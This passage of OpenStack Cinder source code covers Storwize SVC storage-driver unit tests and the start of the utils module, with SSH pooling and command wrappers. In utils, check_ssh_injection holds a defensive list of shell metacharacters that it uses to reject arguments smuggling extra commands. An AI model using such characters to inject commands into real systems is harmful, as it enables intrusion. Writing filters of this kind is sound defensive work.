snap1)\n            self._assert_vol_exists(snap1['name'], False)\n            self.sim.error_injection('prestartfcmap', 'bad_id')\n            self.assertRaises(exception.ProcessExecutionError,\n                              self.driver.create_snapshot, snap1)\n            self._assert_vol_exists(snap1['name'], False)\n\n        # Test successful snapshot\n        self.driver.create_snapshot(snap1)\n        self._assert_vol_exists(snap1['name'], True)\n\n        # Try to create a snapshot from an non-existing volume - should fail\n        snap_novol = self._generate_vol_info('undefined-vol', '12345')\n        self.assertRaises(exception.VolumeNotFound,\n                          self.driver.create_snapshot,\n                          snap_novol)\n\n        # We support deleting a volume that has snapshots, so delete the volume\n        # first\n        self.driver.delete_volume(vol1)\n        self.driver.delete_snapshot(snap1)\n\n    def test_storwize_svc_create_volfromsnap_clone(self):\n        vol1 = self._generate_vol_info(None, None)\n        self.driver.create_volume(vol1)\n        self.driver.db.volume_set(vol1)\n        snap1 = self._generate_vol_info(vol1['name'], vol1['id'])\n        self.driver.create_snapshot(snap1)\n        vol2 = self._generate_vol_info(None, None)\n        vol3 = self._generate_vol_info(None, None)\n\n        # Try to create a volume from a non-existing snapshot\n        snap_novol = self._generate_vol_info('undefined-vol', '12345')\n        vol_novol = self._generate_vol_info(None, None)\n        self.assertRaises(exception.SnapshotNotFound,\n                          self.driver.create_volume_from_snapshot,\n                          vol_novol,\n                          snap_novol)\n\n        # Fail the snapshot\n        orig = self.driver._call_prepare_fc_map\n        self.driver._call_prepare_fc_map = self._fail_prepare_fc_map\n        self.assertRaises(exception.ProcessExecutionError,\n                          self.driver.create_volume_from_snapshot,\n                          vol2, snap1)\n        self.driver._call_prepare_fc_map = orig\n        self._assert_vol_exists(vol2['name'], False)\n\n        # Try to create where source size != target size\n        vol2['size'] += 1\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.create_volume_from_snapshot,\n                          vol2, snap1)\n        self._assert_vol_exists(vol2['name'], False)\n        vol2['size'] -= 1\n\n        # Succeed\n        if self.USESIM:\n            self.sim.error_injection('lsfcmap', 'speed_up')\n        self.driver.create_volume_from_snapshot(vol2, snap1)\n        self._assert_vol_exists(vol2['name'], True)\n\n        # Try to clone where source size != target size\n        vol3['size'] += 1\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.create_cloned_volume,\n                          vol3, vol2)\n        self._assert_vol_exists(vol3['name'], False)\n        vol3['size'] -= 1\n\n        if self.USESIM:\n            self.sim.error_injection('lsfcmap', 'speed_up')\n        self.driver.create_cloned_volume(vol3, vol2)\n        self._assert_vol_exists(vol3['name'], True)\n\n        # Delete in the 'opposite' order to make sure it works\n        self.driver.delete_volume(vol3)\n        self._assert_vol_exists(vol3['name'], False)\n        self.driver.delete_volume(vol2)\n        self._assert_vol_exists(vol2['name'], False)\n        self.driver.delete_snapshot(snap1)\n        self._assert_vol_exists(snap1['name'], False)\n        self.driver.delete_volume(vol1)\n        self._assert_vol_exists(vol1['name'], False)\n\n    def test_storwize_svc_volumes(self):\n        # Create a first volume\n        volume = self._generate_vol_info(None, None)\n        self.driver.create_volume(volume)\n\n        self.driver.ensure_export(None, volume)\n\n        # Do nothing\n        self.driver.create_export(None, volume)\n        self.driver.remove_export(None, volume)\n\n        # Make sure volume attributes are as they should be\n        attributes = self.driver._get_vdisk_attributes(volume['name'])\n        attr_size = float(attributes['capacity']) / (1024 ** 3)  # bytes to GB\n        self.assertEqual(attr_size, float(volume['size']))\n        pool = self.driver.configuration.local_conf.storwize_svc_volpool_name\n        self.assertEqual(attributes['mdisk_grp_name'], pool)\n\n        # Try to create the volume again (should fail)\n        self.assertRaises(exception.ProcessExecutionError,\n                          self.driver.create_volume,\n                          volume)\n\n        # Try to delete a volume that doesn't exist (should not fail)\n        vol_no_exist = {'name': 'i_dont_exist'}\n        self.driver.delete_volume(vol_no_exist)\n        # Ensure export for volume that doesn't exist (should not fail)\n        self.driver.ensure_export(None, vol_no_exist)\n\n        # Delete the volume\n        self.driver.delete_volume(volume)\n\n    def test_storwize_svc_volume_params(self):\n        # Option test matrix\n        # Option        Value   Covered by test #\n        # rsize         -1      1\n        # rsize         2       2,3\n        # warning       0       2\n        # warning       80      3\n        # autoexpand    True    2\n        # autoexpand    False   3\n        # grainsize     32      2\n        # grainsize     256     3\n        # compression   True    4\n        # compression   False   2,3\n        # easytier      True    1,3\n        # easytier      False   2\n\n        opts_list = []\n        chck_list = []\n        opts_list.append({'rsize': -1, 'easytier': True})\n        chck_list.append({'free_capacity': '0', 'easy_tier': 'on'})\n        opts_list.append({'rsize': 2, 'compression': False, 'warning': 0,\n                          'autoexpand': True, 'grainsize': 32,\n                          'easytier': False})\n        chck_list.append({'-free_capacity': '0', 'compressed_copy': 'no',\n                          'warning': '0', 'autoexpand': 'on',\n                          'grainsize': '32', 'easy_tier': 'off'})\n        opts_list.append({'rsize': 2, 'compression': False, 'warning': 80,\n                          'autoexpand': False, 'grainsize': 256,\n                          'easytier': True})\n        chck_list.append({'-free_capacity': '0', 'compressed_copy': 'no',\n                          'warning': '80', 'autoexpand': 'off',\n                          'grainsize': '256', 'easy_tier': 'on'})\n        opts_list.append({'rsize': 2, 'compression': True})\n        chck_list.append({'-free_capacity': '0',\n                          'compressed_copy': 'yes'})\n\n        for idx in range(len(opts_list)):\n            attrs = self._create_test_vol(opts_list[idx])\n            for k, v in chck_list[idx].iteritems():\n                try:\n                    if k[0] == '-':\n                        k = k[1:]\n                        self.assertNotEqual(attrs[k], v)\n                    else:\n                        self.assertEqual(attrs[k], v)\n                except exception.ProcessExecutionError as e:\n                    if 'CMMVC7050E' not in e.stderr:\n                        raise\n\n    def test_storwize_svc_unicode_host_and_volume_names(self):\n        # We'll check with iSCSI only - nothing protocol-dependednt here\n        self._set_flag('storwize_svc_connection_protocol', 'iSCSI')\n        self.driver.do_setup(None)\n\n        rand_id = random.randint(10000, 99999)\n        volume1 = {'name': u'unicode1_volume%s' % rand_id,\n                   'size': 2,\n                   'id': 1,\n                   'volume_type_id': None}\n        self.driver.create_volume(volume1)\n        self._assert_vol_exists(volume1['name'], True)\n\n        self.assertRaises(exception.NoValidHost,\n                          self.driver._connector_to_hostname_prefix,\n                          {'host': 12345})\n\n        # Add a a host first to make life interesting (this host and\n        # conn['host'] should be translated to the same prefix, and the\n        # initiator should differentiate\n        tmpconn1 = {'initiator': u'unicode:initiator1.%s' % rand_id,\n                    'ip': '10.10.10.10',\n                    'host': u'unicode.foo}.bar{.baz-%s' % rand_id}\n        self.driver._create_host(tmpconn1)\n\n        # Add a host with a different prefix\n        tmpconn2 = {'initiator': u'unicode:initiator2.%s' % rand_id,\n                    'ip': '10.10.10.11',\n                    'host': u'unicode.hello.world-%s' % rand_id}\n        self.driver._create_host(tmpconn2)\n\n        conn = {'initiator': u'unicode:initiator3.%s' % rand_id,\n                'ip': '10.10.10.12',\n                'host': u'unicode.foo}.bar}.baz-%s' % rand_id}\n        self.driver.initialize_connection(volume1, conn)\n        host_name = self.driver._get_host_from_connector(conn)\n        self.assertNotEqual(host_name, None)\n        self.driver.terminate_connection(volume1, conn)\n        host_name = self.driver._get_host_from_connector(conn)\n        self.assertEqual(host_name, None)\n        self.driver.delete_volume(volume1)\n\n        # Clean up temporary hosts\n        for tmpconn in [tmpconn1, tmpconn2]:\n            host_name = self.driver._get_host_from_connector(tmpconn)\n            self.assertNotEqual(host_name, None)\n            self.driver._delete_host(host_name)\n\n    def test_storwize_svc_validate_connector(self):\n        conn_neither = {'host': 'host'}\n        conn_iscsi = {'host': 'host', 'initiator': 'foo'}\n        conn_fc = {'host': 'host', 'wwpns': 'bar'}\n        conn_both = {'host': 'host', 'initiator': 'foo', 'wwpns': 'bar'}\n\n        self.driver._enabled_protocols = set(['iSCSI'])\n        self.driver.validate_connector(conn_iscsi)\n        self.driver.validate_connector(conn_both)\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.validate_connector, conn_fc)\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.validate_connector, conn_neither)\n\n        self.driver._enabled_protocols = set(['FC'])\n        self.driver.validate_connector(conn_fc)\n        self.driver.validate_connector(conn_both)\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.validate_connector, conn_iscsi)\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.validate_connector, conn_neither)\n\n        self.driver._enabled_protocols = set(['iSCSI', 'FC'])\n        self.driver.validate_connector(conn_iscsi)\n        self.driver.validate_connector(conn_fc)\n        self.driver.validate_connector(conn_both)\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.validate_connector, conn_neither)\n\n    def test_storwize_svc_host_maps(self):\n        # Create two volumes to be used in mappings\n\n        ctxt = context.get_admin_context()\n        volume1 = self._generate_vol_info(None, None)\n        self.driver.create_volume(volume1)\n        volume2 = self._generate_vol_info(None, None)\n        self.driver.create_volume(volume2)\n\n        # Create volume types that we created\n        types = {}\n        for protocol in ['FC', 'iSCSI']:\n            opts = {'storage_protocol': '<in> ' + protocol}\n            types[protocol] = volume_types.create(ctxt, protocol, opts)\n\n        for protocol in ['FC', 'iSCSI']:\n            volume1['volume_type_id'] = types[protocol]['id']\n            volume2['volume_type_id'] = types[protocol]['id']\n\n            # Check case where no hosts exist\n            if self.USESIM:\n                ret = self.driver._get_host_from_connector(self._connector)\n                self.assertEqual(ret, None)\n\n            # Make sure that the volumes have been created\n            self._assert_vol_exists(volume1['name'], True)\n            self._assert_vol_exists(volume2['name'], True)\n\n            # Initialize connection from the first volume to a host\n            self.driver.initialize_connection(volume1, self._connector)\n\n            # Initialize again, should notice it and do nothing\n            self.driver.initialize_connection(volume1, self._connector)\n\n            # Try to delete the 1st volume (should fail because it is mapped)\n            self.assertRaises(exception.ProcessExecutionError,\n                              self.driver.delete_volume,\n                              volume1)\n\n            # Check bad output from lsfabric for the 2nd volume\n            if protocol == 'FC' and self.USESIM:\n                for error in ['remove_field', 'header_mismatch']:\n                    self.sim.error_injection('lsfabric', error)\n                    self.assertRaises(exception.VolumeBackendAPIException,\n                                      self.driver.initialize_connection,\n                                      volume2, self._connector)\n\n            self.driver.terminate_connection(volume1, self._connector)\n            if self.USESIM:\n                ret = self.driver._get_host_from_connector(self._connector)\n                self.assertEqual(ret, None)\n\n        # Check cases with no auth set for host\n        if self.USESIM:\n            for case in ['no_info', 'no_auth_set']:\n                conn_na = {'initiator': 'test:init:%s' %\n                                        random.randint(10000, 99999),\n                           'ip': '11.11.11.11',\n                           'host': 'host-%s' % case}\n                self.sim._add_host_to_list(conn_na)\n                volume1['volume_type_id'] = types['iSCSI']['id']\n                if case == 'no_info':\n                    self.sim.error_injection('lsiscsiauth', 'no_info')\n                self.driver.initialize_connection(volume1, conn_na)\n                ret = self.driver._get_chap_secret_for_host(conn_na['host'])\n                self.assertNotEqual(ret, None)\n                self.driver.terminate_connection(volume1, conn_na)\n\n        # Test no preferred node\n        if self.USESIM:\n            self.sim.error_injection('lsvdisk', 'no_pref_node')\n            self.assertRaises(exception.VolumeBackendAPIException,\n                              self.driver.initialize_connection,\n                              volume1, self._connector)\n\n        # Initialize connection from the second volume to the host with no\n        # preferred node set if in simulation mode, otherwise, just\n        # another initialize connection.\n        if self.USESIM:\n            self.sim.error_injection('lsvdisk', 'blank_pref_node')\n        self.driver.initialize_connection(volume2, self._connector)\n\n        # Try to remove connection from host that doesn't exist (should fail)\n        conn_no_exist = self._connector.copy()\n        conn_no_exist['initiator'] = 'i_dont_exist'\n        conn_no_exist['wwpns'] = ['0000000000000000']\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.terminate_connection,\n                          volume1,\n                          conn_no_exist)\n\n        # Try to remove connection from volume that isn't mapped (should print\n        # message but NOT fail)\n        vol_no_exist = {'name': 'i_dont_exist'}\n        self.driver.terminate_connection(vol_no_exist, self._connector)\n\n        # Remove the mapping from the 1st volume and delete it\n        self.driver.terminate_connection(volume1, self._connector)\n        self.driver.delete_volume(volume1)\n        self._assert_vol_exists(volume1['name'], False)\n\n        # Make sure our host still exists\n        host_name = self.driver._get_host_from_connector(self._connector)\n        self.assertNotEqual(host_name, None)\n\n        # Remove the mapping from the 2nd volume and delete it. The host should\n        # be automatically removed because there are no more mappings.\n        self.driver.terminate_connection(volume2, self._connector)\n        self.driver.delete_volume(volume2)\n        self._assert_vol_exists(volume2['name'], False)\n\n        # Delete volume types that we created\n        for protocol in ['FC', 'iSCSI']:\n            volume_types.destroy(ctxt, types[protocol]['id'])\n\n        # Check if our host still exists (it should not)\n        if self.USESIM:\n            ret = self.driver._get_host_from_connector(self._connector)\n            self.assertEqual(ret, None)\n\n    def test_storwize_svc_multi_host_maps(self):\n        # We can't test connecting to multiple hosts from a single host when\n        # using real storage\n        if not self.USESIM:\n            return\n\n        # Create a volume to be used in mappings\n        ctxt = context.get_admin_context()\n        volume = self._generate_vol_info(None, None)\n        self.driver.create_volume(volume)\n\n        # Create volume types for protocols\n        types = {}\n        for protocol in ['FC', 'iSCSI']:\n            opts = {'storage_protocol': '<in> ' + protocol}\n            types[protocol] = volume_types.create(ctxt, protocol, opts)\n\n        # Create a connector for the second 'host'\n        wwpns = [str(random.randint(0, 9999999999999999)).zfill(16),\n                 str(random.randint(0, 9999999999999999)).zfill(16)]\n        initiator = 'test.initiator.%s' % str(random.randint(10000, 99999))\n        conn2 = {'ip': '1.234.56.79',\n                 'host': 'storwize-svc-test2',\n                 'wwpns': wwpns,\n                 'initiator': initiator}\n\n        for protocol in ['FC', 'iSCSI']:\n            volume['volume_type_id'] = types[protocol]['id']\n\n            # Make sure that the volume has been created\n            self._assert_vol_exists(volume['name'], True)\n\n            self.driver.initialize_connection(volume, self._connector)\n\n            self._set_flag('storwize_svc_multihostmap_enabled', False)\n            self.assertRaises(exception.CinderException,\n                              self.driver.initialize_connection, volume, conn2)\n\n            self._set_flag('storwize_svc_multihostmap_enabled', True)\n            self.driver.initialize_connection(volume, conn2)\n\n            self.driver.terminate_connection(volume, conn2)\n            self.driver.terminate_connection(volume, self._connector)\n\n    def test_storwize_svc_delete_volume_snapshots(self):\n        # Create a volume with two snapshots\n        master = self._generate_vol_info(None, None)\n        self.driver.create_volume(master)\n        self.driver.db.volume_set(master)\n\n        # Fail creating a snapshot - will force delete the snapshot\n        if self.USESIM and False:\n            snap = self._generate_vol_info(master['name'], master['id'])\n            self.sim.error_injection('startfcmap', 'bad_id')\n            self.assertRaises(exception.ProcessExecutionError,\n                              self.driver.create_snapshot, snap)\n            self._assert_vol_exists(snap['name'], False)\n\n        # Delete a snapshot\n        snap = self._generate_vol_info(master['name'], master['id'])\n        self.driver.create_snapshot(snap)\n        self._assert_vol_exists(snap['name'], True)\n        self.driver.delete_snapshot(snap)\n        self._assert_vol_exists(snap['name'], False)\n\n        # Delete a volume with snapshots (regular)\n        snap = self._generate_vol_info(master['name'], master['id'])\n        self.driver.create_snapshot(snap)\n        self._assert_vol_exists(snap['name'], True)\n        self.driver.delete_volume(master)\n        self._assert_vol_exists(master['name'], False)\n\n        # Fail create volume from snapshot - will force delete the volume\n        if self.USESIM:\n            volfs = self._generate_vol_info(None, None)\n            self.sim.error_injection('startfcmap', 'bad_id')\n            self.sim.error_injection('lsfcmap', 'speed_up')\n            self.assertRaises(exception.ProcessExecutionError,\n                              self.driver.create_volume_from_snapshot,\n                              volfs, snap)\n            self._assert_vol_exists(volfs['name'], False)\n\n        # Create volume from snapshot and delete it\n        volfs = self._generate_vol_info(None, None)\n        if self.USESIM:\n            self.sim.error_injection('lsfcmap', 'speed_up')\n        self.driver.create_volume_from_snapshot(volfs, snap)\n        self._assert_vol_exists(volfs['name'], True)\n        self.driver.delete_volume(volfs)\n        self._assert_vol_exists(volfs['name'], False)\n\n        # Create volume from snapshot and delete the snapshot\n        volfs = self._generate_vol_info(None, None)\n        if self.USESIM:\n            self.sim.error_injection('lsfcmap', 'speed_up')\n        self.driver.create_volume_from_snapshot(volfs, snap)\n        self.driver.delete_snapshot(snap)\n        self._assert_vol_exists(snap['name'], False)\n\n        # Fail create clone - will force delete the target volume\n        if self.USESIM:\n            clone = self._generate_vol_info(None, None)\n            self.sim.error_injection('startfcmap', 'bad_id')\n            self.sim.error_injection('lsfcmap', 'speed_up')\n            self.assertRaises(exception.ProcessExecutionError,\n                              self.driver.create_cloned_volume,\n                              clone, volfs)\n            self._assert_vol_exists(clone['name'], False)\n\n        # Create the clone, delete the source and target\n        clone = self._generate_vol_info(None, None)\n        if self.USESIM:\n            self.sim.error_injection('lsfcmap', 'speed_up')\n        self.driver.create_cloned_volume(clone, volfs)\n        self._assert_vol_exists(clone['name'], True)\n        self.driver.delete_volume(volfs)\n        self._assert_vol_exists(volfs['name'], False)\n        self.driver.delete_volume(clone)\n        self._assert_vol_exists(clone['name'], False)\n\n    # Note defined in python 2.6, so define here...\n    def assertLessEqual(self, a, b, msg=None):\n        if not a <= b:\n            self.fail('%s not less than or equal to %s' % (repr(a), repr(b)))\n\n    def test_storwize_svc_get_volume_stats(self):\n        stats = self.driver.get_volume_stats()\n        self.assertLessEqual(stats['free_capacity_gb'],\n                             stats['total_capacity_gb'])\n        if self.USESIM:\n            self.assertEqual(stats['volume_backend_name'],\n                             'storwize-svc-sim_volpool')\n            self.assertAlmostEqual(stats['total_capacity_gb'], 3328.0)\n            self.assertAlmostEqual(stats['free_capacity_gb'], 3287.5)\n\n    def test_storwize_svc_extend_volume(self):\n        volume = self._generate_vol_info(None, None)\n        self.driver.db.volume_set(volume)\n        self.driver.create_volume(volume)\n        stats = self.driver.extend_volume(volume, '13')\n        attrs = self.driver._get_vdisk_attributes(volume['name'])\n        vol_size = int(attrs['capacity']) / units.GiB\n        self.assertAlmostEqual(vol_size, 13)\n\n        snap = self._generate_vol_info(volume['name'], volume['id'])\n        self.driver.create_snapshot(snap)\n        self._assert_vol_exists(snap['name'], True)\n        self.assertRaises(exception.VolumeBackendAPIException,\n                          self.driver.extend_volume, volume, '16')\n\n        self.driver.delete_snapshot(snap)\n        self.driver.delete_volume(volume)\n\n\nclass CLIResponseTestCase(test.TestCase):\n    def test_empty(self):\n        self.assertEqual(0, len(storwize_svc.CLIResponse('')))\n        self.assertEqual(0, len(storwize_svc.CLIResponse(('', 'stderr'))))\n\n    def test_header(self):\n        raw = r'''id!name\n1!node1\n2!node2\n'''\n        resp = storwize_svc.CLIResponse(raw, with_header=True)\n        self.assertEqual(2, len(resp))\n        self.assertEqual('1', resp[0]['id'])\n        self.assertEqual('2', resp[1]['id'])\n\n    def test_select(self):\n        raw = r'''id!123\nname!Bill\nname!Bill2\nage!30\nhome address!s1\nhome address!s2\n\nid! 7\nname!John\nname!John2\nage!40\nhome address!s3\nhome address!s4\n'''\n        resp = storwize_svc.CLIResponse(raw, with_header=False)\n        self.assertEqual(list(resp.select('home address', 'name',\n                                          'home address')),\n                         [('s1', 'Bill', 's1'), ('s2', 'Bill2', 's2'),\n                          ('s3', 'John', 's3'), ('s4', 'John2', 's4')])\n\n    def test_lsnode_all(self):\n        raw = r'''id!name!UPS_serial_number!WWNN!status\n1!node1!!500507680200C744!online\n2!node2!!500507680200C745!online\n'''\n        resp = storwize_svc.CLIResponse(raw)\n        self.assertEqual(2, len(resp))\n        self.assertEqual('1', resp[0]['id'])\n        self.assertEqual('500507680200C744', resp[0]['WWNN'])\n        self.assertEqual('2', resp[1]['id'])\n        self.assertEqual('500507680200C745', resp[1]['WWNN'])\n\n    def test_lsnode_single(self):\n        raw = r'''id!1\nport_id!500507680210C744\nport_status!active\nport_speed!8Gb\nport_id!500507680240C744\nport_status!inactive\nport_speed!8Gb\n'''\n        resp = storwize_svc.CLIResponse(raw, with_header=False)\n        self.assertEqual(1, len(resp))\n        self.assertEqual('1', resp[0]['id'])\n        self.assertEqual(list(resp.select('port_id', 'port_status')),\n                         [('500507680210C744', 'active'),\n                          ('500507680240C744', 'inactive')])\n/n/n/ncinder/utils.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# Copyright 2011 Justin Santa Barbara\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Utilities and helper functions.\"\"\"\n\n\nimport contextlib\nimport datetime\nimport functools\nimport hashlib\nimport inspect\nimport os\nimport paramiko\nimport pyclbr\nimport random\nimport re\nimport shutil\nimport sys\nimport tempfile\nimport time\nfrom xml.dom import minidom\nfrom xml.parsers import expat\nfrom xml import sax\nfrom xml.sax import expatreader\nfrom xml.sax import saxutils\n\nfrom eventlet import event\nfrom eventlet import greenthread\nfrom eventlet import pools\n\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import importutils\nfrom cinder.openstack.common import lockutils\nfrom cinder.openstack.common import log as logging\nfrom cinder.openstack.common import processutils\nfrom cinder.openstack.common import timeutils\n\n\nCONF = cfg.CONF\nLOG = logging.getLogger(__name__)\nISO_TIME_FORMAT = \"%Y-%m-%dT%H:%M:%S\"\nPERFECT_TIME_FORMAT = \"%Y-%m-%dT%H:%M:%S.%f\"\n\nsynchronized = lockutils.synchronized_with_prefix('cinder-')\n\n\ndef find_config(config_path):\n    \"\"\"Find a configuration file using the given hint.\n\n    :param config_path: Full or relative path to the config.\n    :returns: Full path of the config, if it exists.\n    :raises: `cinder.exception.ConfigNotFound`\n\n    \"\"\"\n    possible_locations = [\n        config_path,\n        os.path.join(CONF.state_path, \"etc\", \"cinder\", config_path),\n        os.path.join(CONF.state_path, \"etc\", config_path),\n        os.path.join(CONF.state_path, config_path),\n        \"/etc/cinder/%s\" % config_path,\n    ]\n\n    for path in possible_locations:\n        if os.path.exists(path):\n            return os.path.abspath(path)\n\n    raise exception.ConfigNotFound(path=os.path.abspath(config_path))\n\n\ndef fetchfile(url, target):\n    LOG.debug(_('Fetching %s') % url)\n    execute('curl', '--fail', url, '-o', target)\n\n\ndef execute(*cmd, **kwargs):\n    \"\"\"Convenience wrapper around oslo's execute() method.\"\"\"\n    if 'run_as_root' in kwargs and not 'root_helper' in kwargs:\n        kwargs['root_helper'] =\\\n            'sudo cinder-rootwrap %s' % CONF.rootwrap_config\n    try:\n        (stdout, stderr) = processutils.execute(*cmd, **kwargs)\n    except processutils.ProcessExecutionError as ex:\n        raise exception.ProcessExecutionError(\n            exit_code=ex.exit_code,\n            stderr=ex.stderr,\n            stdout=ex.stdout,\n            cmd=ex.cmd,\n            description=ex.description)\n    except processutils.UnknownArgumentError as ex:\n        raise exception.Error(ex.message)\n    return (stdout, stderr)\n\n\ndef trycmd(*args, **kwargs):\n    \"\"\"Convenience wrapper around oslo's trycmd() method.\"\"\"\n    if 'run_as_root' in kwargs and not 'root_helper' in kwargs:\n        kwargs['root_helper'] =\\\n            'sudo cinder-rootwrap %s' % CONF.rootwrap_config\n    try:\n        (stdout, stderr) = processutils.trycmd(*args, **kwargs)\n    except processutils.ProcessExecutionError as ex:\n        raise exception.ProcessExecutionError(\n            exit_code=ex.exit_code,\n            stderr=ex.stderr,\n            stdout=ex.stdout,\n            cmd=ex.cmd,\n            description=ex.description)\n    except processutils.UnknownArgumentError as ex:\n        raise exception.Error(ex.message)\n    return (stdout, stderr)\n\n\ndef check_ssh_injection(cmd_list):\n    ssh_injection_pattern = ['`', '$', '|', '||', ';', '&', '&&', '>', '>>',\n                             '<']\n\n    # Check whether injection attacks exist\n    for arg in cmd_list:\n        arg = arg.strip()\n        # First, check no space in the middle of arg\n        arg_len = len(arg.split())\n        if arg_len > 1:\n            raise exception.SSHInjectionThreat(command=str(cmd_list))\n\n        # Second, check whether danger character in command. So the shell\n        # special operator must be a single argument.\n        for c in ssh_injection_pattern:\n            if arg == c:\n                continue\n\n            result = arg.find(c)\n            if not result == -1:\n                if result == 0 or not arg[result - 1] == '\\\\':\n                    raise exception.SSHInjectionThreat(command=cmd_list)\n\n\ndef ssh_execute(ssh, cmd, process_input=None,\n                addl_env=None, check_exit_code=True):\n    LOG.debug(_('Running cmd (SSH): %s'), cmd)\n    if addl_env:\n        raise exception.Error(_('Environment not supported over SSH'))\n\n    if process_input:\n        # This is (probably) fixable if we need it...\n        raise exception.Error(_('process_input not supported over SSH'))\n\n    stdin_stream, stdout_stream, stderr_stream = ssh.exec_command(cmd)\n    channel = stdout_stream.channel\n\n    #stdin.write('process_input would go here')\n    #stdin.flush()\n\n    # NOTE(justinsb): This seems suspicious...\n    # ...other SSH clients have buffering issues with this approach\n    stdout = stdout_stream.read()\n    stderr = stderr_stream.read()\n    stdin_stream.close()\n    stdout_stream.close()\n    stderr_stream.close()\n\n    exit_status = channel.recv_exit_status()\n\n    # exit_status == -1 if no exit code was returned\n    if exit_status != -1:\n        LOG.debug(_('Result was %s') % exit_status)\n        if check_exit_code and exit_status != 0:\n            raise exception.ProcessExecutionError(exit_code=exit_status,\n                                                  stdout=stdout,\n                                                  stderr=stderr,\n                                                  cmd=cmd)\n    channel.close()\n    return (stdout, stderr)\n\n\ndef create_channel(client, width, height):\n    \"\"\"Invoke an interactive shell session on server.\"\"\"\n    channel = client.invoke_shell()\n    channel.resize_pty(width, height)\n    return channel\n\n\nclass SSHPool(pools.Pool):\n    \"\"\"A simple eventlet pool to hold ssh connections.\"\"\"\n\n    def __init__(self, ip, port, conn_timeout, login, password=None,\n                 privatekey=None, *args, **kwargs):\n        self.ip = ip\n        self.port = port\n        self.login = login\n        self.password = password\n        self.conn_timeout = conn_timeout if conn_timeout else None\n        self.privatekey = privatekey\n        super(SSHPool, self).__init__(*args, **kwargs)\n\n    def create(self):\n        try:\n            ssh = paramiko.SSHClient()\n            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n            if self.password:\n                ssh.connect(self.ip,\n                            port=self.port,\n                            username=self.login,\n                            password=self.password,\n                            timeout=self.conn_timeout)\n            elif self.privatekey:\n                pkfile = os.path.expanduser(self.privatekey)\n                privatekey = paramiko.RSAKey.from_private_key_file(pkfile)\n                ssh.connect(self.ip,\n                            port=self.port,\n                            username=self.login,\n                            pkey=privatekey,\n                            timeout=self.conn_timeout)\n            else:\n                msg = _(\"Specify a password or private_key\")\n                raise exception.CinderException(msg)\n\n            # Paramiko by default sets the socket timeout to 0.1 seconds,\n            # ignoring what we set thru the sshclient. This doesn't help for\n            # keeping long lived connections. Hence we have to bypass it, by\n            # overriding it after the transport is initialized. We are setting\n            # the sockettimeout to None and setting a keepalive packet so that,\n            # the server will keep the connection open. All that does is send\n            # a keepalive packet every ssh_conn_timeout seconds.\n            if self.conn_timeout:\n                transport = ssh.get_transport()\n                transport.sock.settimeout(None)\n                transport.set_keepalive(self.conn_timeout)\n            return ssh\n        except Exception as e:\n            msg = _(\"Error connecting via ssh: %s\") % e\n            LOG.error(msg)\n            raise paramiko.SSHException(msg)\n\n    def get(self):\n        \"\"\"\n        Return an item from the pool, when one is available.  This may\n        cause the calling greenthread to block. Check if a connection is active\n        before returning it. For dead connections create and return a new\n        connection.\n        \"\"\"\n        conn = super(SSHPool, self).get()\n        if conn:\n            if conn.get_transport().is_active():\n                return conn\n            else:\n                conn.close()\n        return self.create()\n\n    def remove(self, ssh):\n        \"\"\"Close an ssh client and remove it from free_items.\"\"\"\n        ssh.close()\n        ssh = None\n        if ssh in self.free_items:\n            self.free_items.pop(ssh)\n        if self.current_size > 0:\n            self.current_size -= 1\n\n\ndef cinderdir():\n    import cinder\n    return os.path.abspath(cinder.__file__).split('cinder/__init__.py')[0]\n\n\ndef debug(arg):\n    LOG.debug(_('debug in callback: %s'), arg)\n    return arg\n\n\ndef generate_uid(topic, size=8):\n    characters = '01234567890abcdefghijklmnopqrstuvwxyz'\n    choices = [random.choice(characters) for x in xrange(size)]\n    return '%s-%s' % (topic, ''.join(choices))\n\n\n# Default symbols to use for passwords. Avoids visually confusing characters.\n# ~6 bits per symbol\nDEFAULT_PASSWORD_SYMBOLS = ('23456789',  # Removed: 0,1\n                            'ABCDEFGHJKLMNPQRSTUVWXYZ',   # Removed: I, O\n                            'abcdefghijkmnopqrstuvwxyz')  # Removed: l\n\n\n# ~5 bits per symbol\nEASIER_PASSWORD_SYMBOLS = ('23456789',  # Removed: 0, 1\n                           'ABCDEFGHJKLMNPQRSTUVWXYZ')  # Removed: I, O\n\n\ndef last_completed_audit_period(unit=None):\n    \"\"\"This method gives you the most recently *completed* audit period.\n\n    arguments:\n            units: string, one of 'hour', 'day', 'month', 'year'\n                    Periods normally begin at the beginning (UTC) of the\n                    period unit (So a 'day' period begins at midnight UTC,\n                    a 'month' unit on the 1st, a 'year' on Jan, 1)\n                    unit string may be appended with an optional offset\n                    like so:  'day@18'  This will begin the period at 18:00\n                    UTC.  'month@15' starts a monthly period on the 15th,\n                    and year@3 begins a yearly one on March 1st.\n\n\n    returns:  2 tuple of datetimes (begin, end)\n              The begin timestamp of this audit period is the same as the\n              end of the previous.\n    \"\"\"\n    if not unit:\n        unit = CONF.volume_usage_audit_period\n\n    offset = 0\n    if '@' in unit:\n        unit, offset = unit.split(\"@\", 1)\n        offset = int(offset)\n\n    rightnow = timeutils.utcnow()\n    if unit not in ('month', 'day', 'year', 'hour'):\n        raise ValueError('Time period must be hour, day, month or year')\n    if unit == 'month':\n        if offset == 0:\n            offset = 1\n        end = datetime.datetime(day=offset,\n                                month=rightnow.month,\n                                year=rightnow.year)\n        if end >= rightnow:\n            year = rightnow.year\n            if 